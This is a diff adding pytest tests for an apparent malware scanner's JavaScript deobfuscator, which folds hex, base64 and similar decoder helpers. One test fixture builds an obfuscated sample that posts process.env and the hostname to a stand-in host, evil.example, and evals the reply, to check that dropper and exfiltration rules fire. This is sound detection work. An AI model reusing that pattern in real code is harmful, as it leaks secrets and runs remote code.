@@ -185,3 +185,166 @@ class TestIntegerLiterals:
         assert IntegerLiteral.value("0o17") == 15
         assert IntegerLiteral.value("1_000") == 1000
         assert IntegerLiteral.value("0") == 0
+
+
+def _hex(value: str) -> str:
+    return value.encode().hex()
+
+
+class TestDecoderHelpers:
+    """Item 41: a local function that is one known decode of its parameter, and its calls."""
+
+    HEX = "function g (h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) }\n"
+
+    def _folded(self, source: str) -> str:
+        recovery = Deobfuscator.recover(source, "javascript")
+        assert recovery is not None
+        return recovery.text
+
+    def test_the_hex_pair_helper_names_its_module_and_member(self):
+        text = self._folded(self.HEX + f"require(g('{_hex('axios')}'))[g('{_hex('post')}')](u);")
+        assert "require('axios')['post'](u)" in text
+
+    def test_the_sample_shape_array_of_calls_read_by_index(self):
+        source = (
+            self.HEX + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}')];\nrequire(hl[0]);"
+        )
+        assert "const hl = ['axios', 'post']" in self._folded(source)
+
+    def test_each_helper_spelling(self):
+        call = f"g('{_hex('abc')}')"
+        arrow = "const g = h => h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)));"
+        expression = (
+            "const g = function (h) { return h.replace(/../g, (m) => "
+            "String.fromCharCode(parseInt(m, 16))); };"
+        )
+        local = (
+            "function g (h) { const s = h.replace(/../g, m => "
+            "String.fromCharCode(parseInt(m, 16))); return s }"
+        )
+        for definition in (arrow, expression, local):
+            assert "'abc'" in self._folded(f"{definition}\nuse({call});")
+
+    def test_a_method_of_an_object_literal(self):
+        source = (
+            "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
+            f"use(o.d('{_hex('abc')}'));"
+        )
+        assert "use('abc')" in self._folded(source)
+
+    def test_a_constant_argument(self):
+        assert "use('abc')" in self._folded(self.HEX + f"const H = '{_hex('abc')}';\nuse(g(H));")
+
+    def test_two_layers_fold(self):
+        source = (
+            self.HEX
+            + "const k = s => s.split('').reverse().join('');\n"
+            + f"use(g(k('{_hex('abc')[::-1]}')));"
+        )
+        assert "use('abc')" in self._folded(source)
+
+    def test_every_decode_form(self):
+        raw = base64.b64encode(b"hello there").decode()
+        cases = {
+            "const g = h => Buffer.from(h, 'hex').toString();": _hex("hello there"),
+            "const g = h => Buffer.from(h, 'base64').toString('utf8');": raw,
+            "const g = h => atob(h);": raw,
+            "const g = h => String.fromCharCode(...h);": "[104, 105, 33]",
+            "const g = h => h.map(c => String.fromCharCode(c)).join('');": "[104, 105, 33]",
+            "const g = h => h.split('').reverse().join('');": "olleh",
+        }
+        expected = ["hello there", "hello there", "hello there", "hi!", "hi!", "hello"]
+        for (definition, argument), want in zip(cases.items(), expected, strict=True):
+            literal = argument if argument.startswith("[") else f"'{argument}'"
+            assert f"use('{want}')" in self._folded(f"{definition}\nuse(g({literal}));"), definition
+
+    def test_a_helper_that_is_not_a_known_decode_is_left_alone(self):
+        table = "const T = {a: 'x'}; function g (h) { return T[h]; }\nuse(g('a'));"
+        key = "function g (h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16) ^ KEY)) }"
+        assert Deobfuscator.recover(table, "javascript") is None
+        assert Deobfuscator.recover(key + "\nuse(g('6162'));", "javascript") is None
+
+    def test_a_name_defined_twice_is_not_trusted(self):
+        source = self.HEX + "function g (h) { return h }\n" + f"use(g('{_hex('abc')}'));"
+        assert Deobfuscator.recover(source, "javascript") is None
+
+    def test_bounds(self):
+        from cordon_scanner.analysis.shared.deobfuscation import DecoderHelpers
+
+        assert DecoderHelpers.decode("hex_pairs", _hex("a") * 3000) is None
+        assert (
+            Deobfuscator.recover(self.HEX + f"use(g('{_hex(chr(1) * 4)}'));", "javascript") is None
+        )
+        assert Deobfuscator.recover(self.HEX + "use(g('zz'));", "javascript") is None
+
+    def test_a_decode_that_raises_leaves_the_file_unlifted(self, monkeypatch):
+        from cordon_scanner.analysis.shared.deobfuscation import DecoderHelpers
+
+        def boom(*args, **kwargs):
+            raise ValueError("hostile")
+
+        monkeypatch.setattr(DecoderHelpers, "_pass", boom)
+        assert Deobfuscator.recover(self.HEX + f"use(g('{_hex('abc')}'));", "javascript") is None
+
+    def test_the_decoded_flow_is_judged_by_the_existing_rules(self, tmp_path):
+        source = (
+            self.HEX
+            + "const data = { ...process.env, host: require('os').hostname() };\n"
+            + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}'), g('{_hex('https://evil.example/x')}')];\n"
+            + "module.exports = () => require(hl[0])[[hl[1]]](hl[2], data).then(r => eval(r.data));\n"
+        )
+        config = Config.default().with_overrides(use_cache=False)
+        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, source))
+        lifted = {
+            f.rule_id for f in result.findings if "#deobfuscated.js" in (f.location.path or "")
+        }
+        assert {"MALWARE.DROPPER.001", "MALWARE.EXFIL.BEACON.001"} <= lifted
+        assert not PolicyGate.evaluate(result, config.policy).passed
+
+    def test_a_literal_index_of_a_constant_array_and_a_computed_key_array_are_read(self):
+        source = (
+            self.HEX
+            + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}')];\n"
+            + "use(hl[0], x[[hl[1]]]); let n = hl[5];"
+        )
+        text = self._folded(source)
+        assert "use('axios', x['post'])" in text
+        assert "hl[5]" in text
+
+    def test_an_array_declared_twice_is_not_indexed(self):
+        source = (
+            self.HEX
+            + f"const hl = [g('{_hex('axios')}')];\nfunction f(){{ const hl = []; }}\nuse(hl[0]);"
+        )
+        assert "use(hl[0])" in self._folded(source)
+
+    def test_a_benign_decode_that_reaches_no_sink_does_not_block(self, tmp_path):
+        source = self.HEX + f"module.exports = () => console.log(g('{_hex('hello world')}'));\n"
+        config = Config.default().with_overrides(use_cache=False)
+        result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, source))
+        assert not [
+            f for f in result.findings if f.rule_id.startswith("MALWARE.") or "DROPPER" in f.rule_id
+        ]
+
+    def test_a_method_is_folded_only_on_its_own_object(self):
+        source = (
+            "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
+            f"use(o.d('{_hex('abc')}'), other.d('{_hex('abc')}'), d('{_hex('abc')}'));"
+        )
+        text = self._folded(source)
+        assert f"use('abc', other.d('{_hex('abc')}'), d('{_hex('abc')}'))" in text
+
+    def test_a_helper_that_is_assigned_again_is_not_trusted(self):
+        source = self.HEX + f"g = function (x) {{ return x; }};\nuse(g('{_hex('abc')}'));"
+        assert Deobfuscator.recover(source, "javascript") is None
+
+    def test_work_is_bounded_on_hostile_input(self):
+        arrays = "".join(f"const a{i} = ['p{i}'];\n" for i in range(300))
+        reads = f"use(a0[0], a299[0], g('{_hex('abc')}'));"
+        text = self._folded(self.HEX + arrays + reads)
+        assert "use('p0', a299[0], 'abc')" in text
+        calls = "use(g(v));" * 60_000
+        assert (
+            Deobfuscator.recover(self.HEX + calls + f"use(g('{_hex('abc')}'));", "javascript")
+            is None
+        )
